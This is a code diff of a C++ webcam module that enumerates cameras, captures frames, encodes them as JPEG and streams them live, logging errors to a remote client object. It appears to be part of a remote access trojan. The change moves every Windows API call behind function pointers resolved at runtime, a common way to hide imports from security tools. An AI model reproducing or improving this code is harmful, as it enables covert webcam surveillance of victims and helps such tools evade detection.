@@ -6,12 +6,17 @@ extern Cliente* cCliente;
 
 //Conversion functions
 int mod_Camera::GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
+    if (!this->GDIPLUS.pGetImageEncodersSize || !this->GDIPLUS.pGetImageEncoders) {
+        __DBG_("[X]GetEncoderClsid error");
+        return -1;
+    }
+
     UINT  num = 0;          // number of image encoders
     UINT  size = 0;         // size of the image encoder array in bytes
 
     Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;
 
-    Gdiplus::GetImageEncodersSize(&num, &size);
+    this->GDIPLUS.pGetImageEncodersSize(&num, &size);
     if (size == 0)
         return -1;  // Failure
 
@@ -19,7 +24,7 @@ int mod_Camera::GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
     if (pImageCodecInfo == NULL)
         return -1;  // Failure
 
-    GetImageEncoders(num, size, pImageCodecInfo);
+    this->GDIPLUS.pGetImageEncoders(num, size, pImageCodecInfo);
 
     for (UINT j = 0; j < num; ++j)
     {
@@ -73,11 +78,19 @@ std::vector<BYTE> mod_Camera::bmpHeader(LONG lWidth, LONG lHeight, WORD wBitsPer
 
 std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) {
     //Liberar buffer despues de haberse usado
-    HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);
+    std::vector<BYTE> bJPEGbuffer;
+
+    if (!this->GDIPLUS.pGdiplusStartup || !this->KERNEL32.pGlobalAlloc || !this->SHLWAPI.pSHCreateMemStream ||
+        !this->OLE32.pCreateStreamOnHGlobal || !this->GDIPLUS.pFromStream || !this->GDIPLUS.pGdiplusShutdown ||
+        !this->KERNEL32.pGlobalFree) {
+        __DBG_("[X]toJPEG error");
+        return bJPEGbuffer;
+    }
+    HGLOBAL hGlobalMem = this->KERNEL32.pGlobalAlloc(GHND | GMEM_DDESHARE, 0);
 
     Gdiplus::GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
-    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+    this->GDIPLUS.pGdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
     Gdiplus::Image* nImage = nullptr;
     Gdiplus::Status  stat;
@@ -89,18 +102,16 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
     u_int uiBuffS = 0;
     int iRet = 0;
 
-    std::vector<BYTE> bJPEGbuffer;
-
     HRESULT hr;
 
-    nStream = SHCreateMemStream(bmpBuffer, uiBuffersize);
+    nStream = this->SHLWAPI.pSHCreateMemStream(bmpBuffer, uiBuffersize);
     if (!nStream) {
         __DBG_("[X] SHCreateMemStream error");
         cCliente->m_RemoteLog("[WEBCAM] SHCreateMemStream error : " + std::to_string(GetLastError()));
         goto release;
     }
 
-    hr = CreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
+    hr = this->OLE32.pCreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
     if (hr != S_OK) {
         __DBG_("[X] CreateStreamOnHGlobal error");
         cCliente->m_RemoteLog("[WEBCAM] CreateStreamOnHGlobal error : " + std::to_string(GetLastError()));
@@ -109,7 +120,7 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
 
     nStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
 
-    nImage = Gdiplus::Image::FromStream(nStream);
+    nImage = this->GDIPLUS.pFromStream(nStream, FALSE);
     if (nImage == nullptr || nImage->GetLastStatus() != Gdiplus::Ok) {
         __DBG_("[X] Gdiplus::Image::FromStream error");
         cCliente->m_RemoteLog("[WEBCAM] Gdiplus::Image::FromStream error : " + std::to_string(GetLastError()));
@@ -161,30 +172,32 @@ std::vector<BYTE> mod_Camera::toJPEG(const BYTE* bmpBuffer, u_int uiBuffersize) 
         delete nImage;
         nImage = nullptr;
     }
-    Gdiplus::GdiplusShutdown(gdiplusToken);
-    GlobalFree(hGlobalMem);
+
+    this->GDIPLUS.pGdiplusShutdown(gdiplusToken);
+    this->KERNEL32.pGlobalFree(hGlobalMem);
 
     return bJPEGbuffer;
 }
 
-HRESULT mod_Camera::ListCaptureDevices(std::vector<IMFActivate*>& devices)
-{
+HRESULT mod_Camera::ListCaptureDevices(std::vector<IMFActivate*>& devices){
+    if (!this->MFPLAT.pMFCreateAttributes || !this->MF.pMFEnumDeviceSources || !this->OLE32.pCoTaskMemFree) {
+        __DBG_("[X]mod_cam ListCaptureDevices error");
+        return E_FAIL;
+    }
+
     IMFAttributes* pAttributes = NULL;
-    HRESULT hr = MFCreateAttributes(&pAttributes, 1);
-    if (SUCCEEDED(hr))
-    {
+    HRESULT hr = this->MFPLAT.pMFCreateAttributes(&pAttributes, 1);
+    if (SUCCEEDED(hr)){
         hr = pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
-        if (SUCCEEDED(hr))
-        {
+        if (SUCCEEDED(hr)){
             UINT32 count = 0;
             IMFActivate** ppDevices = NULL;
-            hr = MFEnumDeviceSources(pAttributes, &ppDevices, &count);
-            if (SUCCEEDED(hr))
-            {
+            hr = this->MF.pMFEnumDeviceSources(pAttributes, &ppDevices, &count);
+            if (SUCCEEDED(hr)){
                 for (UINT32 i = 0; i < count; i++){
                     devices.push_back(ppDevices[i]);
                 }
-                CoTaskMemFree(ppDevices);
+                this->OLE32.pCoTaskMemFree(ppDevices);
             }
         }
         pAttributes->Release();
@@ -194,15 +207,22 @@ HRESULT mod_Camera::ListCaptureDevices(std::vector<IMFActivate*>& devices)
 
 std::vector<std::string> mod_Camera::ListNameCaptureDevices() {
     std::vector<std::string> vcDevices;
+
+    if (!this->MFPLAT.pMFCreateAttributes || !this->MF.pMFEnumDeviceSources ||
+        !this->OLE32.pCoTaskMemFree) {
+        __DBG_("[X]mod_cam ListNameCaptureDevices error");
+        return vcDevices;
+    }
+
     IMFAttributes* pAttributes = NULL;
     bool vcFlag = this->vcCamObjs.size() > 0 ? true : false;
-    HRESULT hr = MFCreateAttributes(&pAttributes, 1);
+    HRESULT hr = this->MFPLAT.pMFCreateAttributes(&pAttributes, 1);
     if (SUCCEEDED(hr)){
         hr = pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
         if (SUCCEEDED(hr)){
             UINT32 count = 0;
             IMFActivate** ppDevices = NULL;
-            hr = MFEnumDeviceSources(pAttributes, &ppDevices, &count);
+            hr = this->MF.pMFEnumDeviceSources(pAttributes, &ppDevices, &count);
             if (SUCCEEDED(hr)){
                 for (UINT32 i = 0; (i < count && i < MAX_CAMS); i++){
                     WCHAR* szFriendlyName = NULL;
@@ -233,9 +253,9 @@ std::vector<std::string> mod_Camera::ListNameCaptureDevices() {
 
                     this->vcCamObjs.push_back(cam_Temp);
                     
-                    CoTaskMemFree(szFriendlyName);
+                    this->OLE32.pCoTaskMemFree(szFriendlyName);
                 }
-                CoTaskMemFree(ppDevices);
+                this->OLE32.pCoTaskMemFree(ppDevices);
             }
         }
         pAttributes->Release();
@@ -243,8 +263,11 @@ std::vector<std::string> mod_Camera::ListNameCaptureDevices() {
     return vcDevices;
 }
 
-HRESULT mod_Camera::ConfigureSourceReader(IMFSourceReader*& pReader, int pIndexDev)
-{
+HRESULT mod_Camera::ConfigureSourceReader(IMFSourceReader*& pReader, int pIndexDev){
+    if (!this->MFAPI.pMFGetAttributeSize || !this->MFAPI.pMFGetAttributeRatio) {
+        __DBG_("[X] mod_cam ConfigureSourceReader error");
+        return E_FAIL;
+    }
     // The list of acceptable types.
     /*GUID subtypes[] = {
         MFVideoFormat_NV12, MFVideoFormat_YUY2, MFVideoFormat_UYVY,
@@ -331,8 +354,8 @@ HRESULT mod_Camera::ConfigureSourceReader(IMFSourceReader*& pReader, int pIndexD
     }
 
     //Obtener resolution de buffer capturado
-    hr = MFGetAttributeSize(pType, MF_MT_FRAME_SIZE, &this->vcCamObjs[pIndexDev].width, &this->vcCamObjs[pIndexDev].height);
-    hr = MFGetAttributeRatio(pType, MF_MT_FRAME_RATE, &this->vcCamObjs[pIndexDev].numerator, &this->vcCamObjs[pIndexDev].denominator);
+    hr = this->MFAPI.pMFGetAttributeSize(pType, MF_MT_FRAME_SIZE, &this->vcCamObjs[pIndexDev].width, &this->vcCamObjs[pIndexDev].height);
+    hr = this->MFAPI.pMFGetAttributeRatio(pType, MF_MT_FRAME_RATE, &this->vcCamObjs[pIndexDev].numerator, &this->vcCamObjs[pIndexDev].denominator);
 
 done:
 
@@ -358,18 +381,23 @@ HRESULT mod_Camera::ConfigureCapture(IMFSourceReader*& pReader, int pIndexDev){
 }
 
 HRESULT mod_Camera::OpenMediaSource(IMFMediaSource*& pSource, IMFSourceReader*& pReader){
+    if (!this->MFPLAT.pMFCreateAttributes || !this->MFREADWRITE.pMFCreateSourceReaderFromMediaSource) {
+        __DBG_("[X] mod_cam OpenMediaSource error");
+        return E_FAIL;
+    }
+
     HRESULT hr = S_OK;
 
     IMFAttributes* pAttributes = NULL;
     
-    hr = MFCreateAttributes(&pAttributes, 2);
+    hr = this->MFPLAT.pMFCreateAttributes(&pAttributes, 2);
 
     if (SUCCEEDED(hr)){
         hr = pAttributes->SetUnknown(MF_SOURCE_READER_ASYNC_CALLBACK, NULL);
     }
 
     if (SUCCEEDED(hr)) {
-        hr = MFCreateSourceReaderFromMediaSource(
+        hr = this->MFREADWRITE.pMFCreateSourceReaderFromMediaSource(
             pSource,
             pAttributes,
             &pReader
@@ -403,6 +431,15 @@ std::vector<BYTE> mod_Camera::GetFrame(int pIndexDev) {
     //Liberar buffer retornado despues de haberse usado
     
     std::vector<BYTE> cBufferOut;
+
+    if(!this->MFPLAT.pMFTRegisterLocalByCLSID || !this->OLE32.pCoCreateInstance ||
+        !this->MFPLAT.pMFCreateMediaType || !this->MFAPI.pMFSetAttributeSize ||
+        !this->MFAPI.pMFSetAttributeRatio || !this->MFPLAT.pMFCreateSample ||
+        !this->MFPLAT.pMFCreateMemoryBuffer){
+        __DBG_("[X] mod_cam GetFrame error");
+        return cBufferOut;
+    }
+
     DWORD streamIndex, flags;
     LONGLONG llTimeStamp;
     IMFSample* pSample = NULL;
@@ -456,8 +493,8 @@ std::vector<BYTE> mod_Camera::GetFrame(int pIndexDev) {
 
             HRESULT ttRES = S_OK;
             //pTransform
-            MFTRegisterLocalByCLSID(CLSID_CColorConvertDMO, MFT_CATEGORY_VIDEO_PROCESSOR, L"", MFT_ENUM_FLAG_SYNCMFT, 0, NULL, 0, NULL);
-            ttRES = CoCreateInstance(CLSID_CColorConvertDMO, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pTransform));
+            this->MFPLAT.pMFTRegisterLocalByCLSID(CLSID_CColorConvertDMO, MFT_CATEGORY_VIDEO_PROCESSOR, L"", MFT_ENUM_FLAG_SYNCMFT, 0, NULL, 0, NULL);
+            ttRES = this->OLE32.pCoCreateInstance(CLSID_CColorConvertDMO, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pTransform));
 
             ttRES = pTransform->GetStreamIDs(1, &m_dwInputID, 1, &m_dwOutputID);
 
@@ -470,24 +507,24 @@ std::vector<BYTE> mod_Camera::GetFrame(int pIndexDev) {
             }
 
             //pInputType
-            ttRES = MFCreateMediaType(&pInputType);
+            ttRES = this->MFPLAT.pMFCreateMediaType(&pInputType);
             ttRES = pInputType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
             ttRES = pInputType->SetGUID(MF_MT_SUBTYPE, this->vcCamObjs[pIndexDev].mediaType);
-            ttRES = MFSetAttributeSize(pInputType, MF_MT_FRAME_SIZE, this->vcCamObjs[pIndexDev].width, this->vcCamObjs[pIndexDev].height);
-            ttRES = MFSetAttributeRatio(pInputType, MF_MT_FRAME_RATE, this->vcCamObjs[pIndexDev].numerator, this->vcCamObjs[pIndexDev].denominator);
-            ttRES = MFSetAttributeRatio(pInputType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);
+            ttRES = this->MFAPI.pMFSetAttributeSize(pInputType, MF_MT_FRAME_SIZE, this->vcCamObjs[pIndexDev].width, this->vcCamObjs[pIndexDev].height);
+            ttRES = this->MFAPI.pMFSetAttributeRatio(pInputType, MF_MT_FRAME_RATE, this->vcCamObjs[pIndexDev].numerator, this->vcCamObjs[pIndexDev].denominator);
+            ttRES = this->MFAPI.pMFSetAttributeRatio(pInputType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);
             ttRES = pTransform->SetInputType(m_dwInputID, pInputType, 0);
 
             //pOutputType
-            ttRES = MFCreateMediaType(&pOutputType);
+            ttRES = this->MFPLAT.pMFCreateMediaType(&pOutputType);
             ttRES = pOutputType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
             ttRES = pOutputType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_RGB24);
             ttRES = pOutputType->SetUINT32(MF_MT_FIXED_SIZE_SAMPLES, 1);
             ttRES = pOutputType->SetUINT32(MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);
             ttRES = pOutputType->SetUINT32(MF_MT_ALL_SAMPLES_INDEPENDENT, TRUE);
-            ttRES = MFSetAttributeSize(pOutputType, MF_MT_FRAME_SIZE, this->vcCamObjs[pIndexDev].width, this->vcCamObjs[pIndexDev].height);
-            ttRES = MFSetAttributeRatio(pOutputType, MF_MT_FRAME_RATE, this->vcCamObjs[pIndexDev].numerator, this->vcCamObjs[pIndexDev].denominator);
-            ttRES = MFSetAttributeRatio(pOutputType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);
+            ttRES = this->MFAPI.pMFSetAttributeSize(pOutputType, MF_MT_FRAME_SIZE, this->vcCamObjs[pIndexDev].width, this->vcCamObjs[pIndexDev].height);
+            ttRES = this->MFAPI.pMFSetAttributeRatio(pOutputType, MF_MT_FRAME_RATE, this->vcCamObjs[pIndexDev].numerator, this->vcCamObjs[pIndexDev].denominator);
+            ttRES = this->MFAPI.pMFSetAttributeRatio(pOutputType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);
 
 
             ttRES = pTransform->SetOutputType(m_dwOutputID, pOutputType, 0);
@@ -495,9 +532,9 @@ std::vector<BYTE> mod_Camera::GetFrame(int pIndexDev) {
             
             ttRES = pTransform->GetOutputStreamInfo(m_dwOutputID, &StreamInfo);
 
-            MFCreateSample(&pOutSample);
+            this->MFPLAT.pMFCreateSample(&pOutSample);
 
-            MFCreateMemoryBuffer(StreamInfo.cbSize, &npBuffer);
+            this->MFPLAT.pMFCreateMemoryBuffer(StreamInfo.cbSize, &npBuffer);
             pOutSample->AddBuffer(npBuffer);
 
             MFT_OUTPUT_DATA_BUFFER outputDataBuffer;
@@ -632,5 +669,42 @@ void mod_Camera::LiveCam(int pIndexDev) {
 
         __DBG_("[!]Live terminado");
         cCliente->m_RemoteLog("[WEBCAM] Live finalizado");
+    }
+}
+
+mod_Camera::mod_Camera(st_GdiPlus& _gdiplus, st_Shlwapi& _shlwapi, st_Mfplat& _mfplat,
+    st_Mf& _mf, st_Mfapi& _mfapi, st_Mfreadwrite& _mfreadwrite, st_Ole32& _ole32, st_Kernel32& _kernel32) {
+    this->GDIPLUS = _gdiplus;
+    this->KERNEL32 = _kernel32;
+    this->OLE32 = _ole32;
+    this->SHLWAPI = _shlwapi;
+    this->MFPLAT = _mfplat;
+    this->MF = _mf;
+    this->MFAPI = _mfapi;
+    this->MFREADWRITE = _mfreadwrite;
+
+    if (this->OLE32.pCoInitialize && this->MFPLAT.pMFStartup) {
+        this->OLE32.pCoInitialize(nullptr);
+        this->MFPLAT.pMFStartup(MF_VERSION, MFSTARTUP_FULL);
+    } else {
+        __DBG_("[X]mod_cam init error dll");
+    }
+}
+
+mod_Camera::~mod_Camera() {
+    for (int iThNum = 0; iThNum < MAX_CAMS; iThNum++) {
+        if (this->thLive[iThNum].joinable()) {
+            this->thLive[iThNum].join();
+        }
+    }
+    for (int iCount = 0; iCount<int(this->vcCamObjs.size()); iCount++) {
+        this->vcCamObjs[iCount].ReleaseCam();
+    }
+
+    if (this->OLE32.pCoUninitialize && this->MFPLAT.pMFShutdown) {
+        this->OLE32.pCoUninitialize();
+        this->MFPLAT.pMFShutdown();
+    }else {
+        __DBG_("[X]mod_cam shutdown error dll");
     }
 }
